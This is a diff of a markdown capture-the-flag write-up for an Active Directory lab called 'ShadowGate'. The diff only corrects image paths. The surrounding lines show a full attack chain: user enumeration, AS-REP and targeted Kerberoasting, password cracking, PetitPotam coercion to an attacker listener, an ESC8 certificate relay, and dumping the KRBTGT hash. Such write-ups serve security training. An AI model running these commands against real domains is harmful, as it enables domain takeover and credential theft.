@@ -2,7 +2,7 @@
 
 ## ShadowGate
 
-![image.png](<../.gitbook/assets/image (12).png>)
+![image.png](<../../.gitbook/assets/image (12).png>)
 
 ### Objective
 
@@ -166,7 +166,7 @@ _ssl-date: TLS randomness does not represent time
 dig axfr shadow.gate @10.1.107.189
 ```
 
-![image.png](<../.gitbook/assets/image 1 (11).png>)
+![image.png](<../../.gitbook/assets/image 1 (11).png>)
 
 * not able to get anything interesting
 
@@ -188,13 +188,13 @@ rpcclient -U '%' 10.1.107.189 -c "enumdomusers"
 rpcclient -U '%'10.1.107.189 -c "querydispinfo"
 ```
 
-![https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap\_ad\_dark\_classic\_2025.03.excalidraw.svg](<../.gitbook/assets/image 2 (11).png>)
+![https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap\_ad\_dark\_classic\_2025.03.excalidraw.svg](<../../.gitbook/assets/image 2 (11).png>)
 
 [https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap\_ad\_dark\_classic\_2025.03.excalidraw.svg](https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg)
 
-![image.png](<../.gitbook/assets/image 3 (11).png>)
+![image.png](<../../.gitbook/assets/image 3 (11).png>)
 
-![image.png](<../.gitbook/assets/image 4 (11).png>)
+![image.png](<../../.gitbook/assets/image 4 (11).png>)
 
 * We have obtained users
 *   As a best practice, we can test if the usernames are valid as well
@@ -203,18 +203,18 @@ rpcclient -U '%'10.1.107.189 -c "querydispinfo"
     kerbrute userenum --dc 10.1.107.189 --domain shadow.gate users.txt
     ```
 
-    ![image.png](<../.gitbook/assets/image 5 (11).png>)
+    ![image.png](<../../.gitbook/assets/image 5 (11).png>)
 
     * Okay now we now have valid usernames and no password what can we do??
     * Lets Reference https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap\_ad\_dark\_classic\_2025.03.excalidraw.svg for way forwards
 
-    ![image.png](<../.gitbook/assets/image 6 (9).png>)
+    ![image.png](<../../.gitbook/assets/image 6 (9).png>)
 
     https://github.com/TeneBrae93/offensivesecurity/tree/main/active-directory
 
-    ![image.png](<../.gitbook/assets/image 7 (11).png>)
+    ![image.png](<../../.gitbook/assets/image 7 (11).png>)
 
-    ![image.png](<../.gitbook/assets/image 8 (10).png>)
+    ![image.png](<../../.gitbook/assets/image 8 (10).png>)
 
     * We successfully obtained an asrep hash for user `jtrueblood` and cracked it
     *   Confirming if the creds work
@@ -223,7 +223,7 @@ rpcclient -U '%'10.1.107.189 -c "querydispinfo"
         nxc smb 10.1.107.189 -u jtrueblood -p 'REDACTED' --shares
         ```
 
-        ![image.png](<../.gitbook/assets/image 9 (10).png>)
+        ![image.png](<../../.gitbook/assets/image 9 (10).png>)
 
         * Seeing `CertEnroll` with **READ** access on a Domain Controller is a significant find. It strongly suggests that **Active Directory Certificate Services (AD CS)** is running in this environment.
         * Before we dive straight into ADCS , its always a good practise to obtained bloodhound data
@@ -234,18 +234,18 @@ rpcclient -U '%'10.1.107.189 -c "querydispinfo"
 nxc ldap DC01.shadow.gate  -u jtrueblood -p 'REDACTED' --bloodhound --collection All --dns-server 10.1.107.189
 ```
 
-![image.png](<../.gitbook/assets/image 10 (10).png>)
+![image.png](<../../.gitbook/assets/image 10 (10).png>)
 
 **Bloodhound Enumeration**
 
-![image.png](<../.gitbook/assets/image 11 (10).png>)
+![image.png](<../../.gitbook/assets/image 11 (10).png>)
 
-![image.png](<../.gitbook/assets/image 21 (9).png>)
+![image.png](<../../.gitbook/assets/image 21 (9).png>)
 
 * The user `JTRUEBLOOD@SHADOW.GATE` has generic write access to the user `BBROWN@SHADOW.GATE`.
 * Generic Write access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user
 
-![image.png](<../.gitbook/assets/image 22 (9).png>)
+![image.png](<../../.gitbook/assets/image 22 (9).png>)
 
 * **`BBROWN`** is a member of **`ADCS-READER`**
 * **`AUTHENTICATED USERS`** (which includes , `JTRUEBLOOD`) is a member of **`CERTIFICATE SERVICE DCOM ACCESS`**.
@@ -255,13 +255,13 @@ nxc ldap DC01.shadow.gate  -u jtrueblood -p 'REDACTED' --bloodhound --collection
 certipy find -u jtrueblood -p 'REDACTED' -dc-ip 10.1.107.189 -stdout
 ```
 
-![image.png](<../.gitbook/assets/image 14 (10).png>)
+![image.png](<../../.gitbook/assets/image 14 (10).png>)
 
 * The Certipy output confirms that **Web Enrollment is enabled over HTTP** and **Authenticated Users** have **Enroll** permissions.
 * ESC8 describes a privilege escalation vector where an attacker performs an NTLM relay attack against an AD CS HTTP-based enrollment endpoint
 * We can use https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation for our privesc
 
-![image.png](<../.gitbook/assets/image 15 (8).png>)
+![image.png](<../../.gitbook/assets/image 15 (8).png>)
 
 **Exploiting ESC8 requires two main components:**
 
@@ -280,13 +280,13 @@ certipy find -u jtrueblood -p 'REDACTED' -dc-ip 10.1.107.189 -stdout
     * The attacker uses a separate tool (e.g., PetitPotam, Coercer) to force the target (e.g., a Domain Controller `DC.CORP.LOCAL` or a privileged user `Administrator`) to attempt an NTLM authentication against the attacker's machine where Certipy's relay is listening.
     * https://www.netexec.wiki/smb-protocol/scan-for-vulnerabilities
 
-    ![image.png](<../.gitbook/assets/image 16 (8).png>)
+    ![image.png](<../../.gitbook/assets/image 16 (8).png>)
 
     ```bash
     nxc smb 10.1.107.189 -u jtrueblood -p 'REDACTED' -M coerce_plus
     ```
 
-    ![image.png](<../.gitbook/assets/image 17 (9).png>)
+    ![image.png](<../../.gitbook/assets/image 17 (9).png>)
 
     * It’s vulnerable to almost every major coercion method in the book: **DFSCoerce, PetitPotam, PrinterBug,** and **MSEven**.
     *   now we need to trigger the coercion using `PetitPotam`
@@ -295,9 +295,9 @@ certipy find -u jtrueblood -p 'REDACTED' -dc-ip 10.1.107.189 -stdout
         nxc smb 10.1.107.189 -u jtrueblood -p 'REDACTED' -M coerce_plus -o LISTENER=10.200.56.20 ALWAYS=true
         ```
 
-        ![image.png](<../.gitbook/assets/image 18 (7).png>)
+        ![image.png](<../../.gitbook/assets/image 18 (7).png>)
 
-        ![image.png](<../.gitbook/assets/image 19 (9).png>)
+        ![image.png](<../../.gitbook/assets/image 19 (9).png>)
 
         Received connection without a Saved certificate
 
@@ -305,7 +305,7 @@ certipy find -u jtrueblood -p 'REDACTED' -dc-ip 10.1.107.189 -stdout
         certipy relay -target 'http://10.1.107.189/certsrv/certfnsh.asp' -template 'Machine'
         ```
 
-        ![image.png](<../.gitbook/assets/image 20 (8).png>)
+        ![image.png](<../../.gitbook/assets/image 20 (8).png>)
 
         * target template and identity that is being relayed DO NOT have permission to enroll.
         * **`BBROWN`** is a member of **`ADCS-READER`**
@@ -313,9 +313,9 @@ certipy find -u jtrueblood -p 'REDACTED' -dc-ip 10.1.107.189 -stdout
 
 ### Compromising BBROWN
 
-![image.png](<../.gitbook/assets/image 21 (9).png>)
+![image.png](<../../.gitbook/assets/image 21 (9).png>)
 
-![image.png](<../.gitbook/assets/image 22 (9).png>)
+![image.png](<../../.gitbook/assets/image 22 (9).png>)
 
 *   Need to perform a targeted kerberoast https://github.com/ShutdownRepo/targetedKerberoast
 
@@ -323,7 +323,7 @@ certipy find -u jtrueblood -p 'REDACTED' -dc-ip 10.1.107.189 -stdout
     targetedKerberoast.py -v -d 'shadow.gate' -u jtrueblood -p 'REDACTED'
     ```
 
-    ![image.png](<../.gitbook/assets/image 23 (9).png>)
+    ![image.png](<../../.gitbook/assets/image 23 (9).png>)
 
     * The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well.
 
@@ -331,7 +331,7 @@ certipy find -u jtrueblood -p 'REDACTED' -dc-ip 10.1.107.189 -stdout
     hashcat -m 13100 -a0 TK.txt /usr/share/wordlists/rockyou.txt
     ```
 
-    ![image.png](<../.gitbook/assets/image 24 (9).png>)
+    ![image.png](<../../.gitbook/assets/image 24 (9).png>)
 
     * Successfully obtained `bbrown` password
 
@@ -341,7 +341,7 @@ certipy find -u jtrueblood -p 'REDACTED' -dc-ip 10.1.107.189 -stdout
 nxc smb 10.1.107.189 -u bbrown -p 'REDACTED'
 ```
 
-![image.png](<../.gitbook/assets/image 25 (9).png>)
+![image.png](<../../.gitbook/assets/image 25 (9).png>)
 
 * Successfully obtained valid creds
 *   Now we can pivot to using `bbrown` to Exploiting ESC8
@@ -354,13 +354,13 @@ nxc smb 10.1.107.189 -u bbrown -p 'REDACTED'
 
     ```
 
-    ![image.png](<../.gitbook/assets/image 26 (8).png>)
+    ![image.png](<../../.gitbook/assets/image 26 (8).png>)
 
     OR USE THE BELOW
 
     * Looking at https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap\_ad\_dark\_classic\_2025.03.excalidraw.svg we can use the [petitpotam.py](http://petitpotam.py) https://github.com/topotam/PetitPotam
 
-    ![image.png](<../.gitbook/assets/image 27 (8).png>)
+    ![image.png](<../../.gitbook/assets/image 27 (8).png>)
 
     ```bash
     python3 PetitPotam.py -u 'bbrown' -p 'REDACTED' -d shadow.gate 10.200.56.20 10.1.107.189
@@ -372,7 +372,7 @@ nxc smb 10.1.107.189 -u bbrown -p 'REDACTED'
     certipy auth -pfx 'dc01.pfx' -dc-ip '10.1.107.189'
     ```
 
-    ![image.png](<../.gitbook/assets/image 28 (7).png>)
+    ![image.png](<../../.gitbook/assets/image 28 (7).png>)
 
 #### What is the KRBTGT NT Hash?
 
@@ -383,4 +383,4 @@ nxc smb 10.1.107.189 -u bbrown -p 'REDACTED'
   -just-dc
 ```
 
-![image.png](<../.gitbook/assets/image 29 (7).png>)
+![image.png](<../../.gitbook/assets/image 29 (7).png>)
